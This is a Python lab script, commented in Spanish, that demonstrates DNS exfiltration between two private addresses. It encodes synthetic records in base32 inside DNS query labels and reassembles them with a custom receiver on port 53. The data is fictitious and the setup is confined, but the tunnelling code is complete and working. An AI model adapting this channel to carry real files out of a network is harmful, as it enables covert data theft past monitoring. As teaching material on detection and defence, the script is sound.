#!/usr/bin/env python3
"""Demostración fija y educativa. Sólo transmite el archivo sintético generado aquí.

Se ejecuta dentro de DOS namespaces sin ruta predeterminada. No admite destinos
arbitrarios ni archivos proporcionados como parámetros. No usa el resolver público.
"""
import base64
import hashlib
import json
import pathlib
import secrets
import socket
import struct
import sys
import time

ROOT = pathlib.Path(__file__).resolve().parents[1]
SERVER = '10.203.0.2'
CLIENT = '10.203.0.1'
SUFFIX = 'transfer.lab.test'
CONTENT = ('LABORATORIO DE CIBERSEGURIDAD\n'
           'Datos ficticios para prueba de exfiltracion DNS.\n'
           'ID-DEMO-2026-001\n' + ''.join(
               f'REGISTRO-FICTICIO-{i:03d}; valor={i*7:04d}; sin informacion personal.\n'
               for i in range(1, 17))).encode('ascii')

def encode_name(name):
    labels = name.encode('ascii').split(b'.')
    assert all(0 < len(label) <= 63 for label in labels)
    encoded = b''.join(bytes([len(label)]) + label for label in labels) + b'\0'
    assert len(encoded) <= 255
    return encoded

def question(data):
    pos, labels = 12, []
    while data[pos]:
        length = data[pos]
        if length > 63: raise ValueError('Etiqueta no admitida')
        labels.append(data[pos+1:pos+1+length].decode('ascii'))
        pos += 1 + length
    end = pos + 5
    assert struct.unpack('!HH',data[pos+1:end]) == (1,1)
    return '.'.join(labels), end

def receiver():
    chunks = {}
    records = []
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.bind((SERVER,53))
        sock.settimeout(20)
        (ROOT/'resultados/receptor_listo').write_text('listo\n')
        while True:
            data, peer = sock.recvfrom(2048)
            assert peer[0] == CLIENT
            name, end = question(data)
            labels = name.split('.')
            assert '.'.join(labels[3:]) == SUFFIX
            index, total = int(labels[0][1:]), int(labels[1][1:])
            payload = labels[2].upper()
            chunk = base64.b32decode(payload + '='*((-len(payload))%8))
            assert index not in chunks
            chunks[index] = chunk
            records.append({'timestamp':time.time(),'peer':list(peer),'qname':name,
                            'index':index,'total':total,'bytes':len(chunk)})
            # Respuesta A inocua de acuse de recibo; no hay recursión.
            answer = (data[:2] + struct.pack('!HHHHH',0x8400,1,1,0,0) + data[12:end]
                      + b'\xc0\x0c' + struct.pack('!HHIH',1,1,0,4)
                      + socket.inet_aton(SERVER))
            sock.sendto(answer,peer)
            if len(chunks) == total:
                restored = b''.join(chunks[i] for i in range(total))
                (ROOT/'resultados/dns_demo_recibido.txt').write_bytes(restored)
                (ROOT/'resultados/receptor.json').write_text(json.dumps(records,indent=2))
                print(json.dumps({'received_bytes':len(restored),'chunks':total,
                                  'sha256':hashlib.sha256(restored).hexdigest()}), flush=True)
                return

def sender():
    (ROOT/'resultados/dns_demo.txt').write_bytes(CONTENT)
    chunks = [CONTENT[i:i+32] for i in range(0,len(CONTENT),32)]
    records = []
    with socket.socket(socket.AF_INET,socket.SOCK_DGRAM) as sock:
        sock.bind((CLIENT,0))
        sock.connect((SERVER,53))
        sock.settimeout(3)
        for index, chunk in enumerate(chunks):
            payload = base64.b32encode(chunk).decode('ascii').rstrip('=').lower()
            name = f's{index:04d}.n{len(chunks):04d}.{payload}.{SUFFIX}'
            txid = secrets.randbelow(65536)
            data = struct.pack('!HHHHHH',txid,0,1,0,0,0) + encode_name(name) + struct.pack('!HH',1,1)
            sock.send(data)
            response = sock.recv(2048)
            assert response[:2] == data[:2] and response[2:4] == b'\x84\x00'
            records.append({'index':index,'txid':txid,'qname':name,'socket':sock.getsockname(),
                            'query_bytes':len(data),'response_bytes':len(response)})
            time.sleep(0.2)
    (ROOT/'resultados/emisor.json').write_text(json.dumps(records,indent=2))
    print(json.dumps({'synthetic_bytes':len(CONTENT),'chunks':len(chunks),
                      'sha256':hashlib.sha256(CONTENT).hexdigest()}), flush=True)

if __name__ == '__main__':
    {'receiver':receiver,'sender':sender}[sys.argv[1]]()
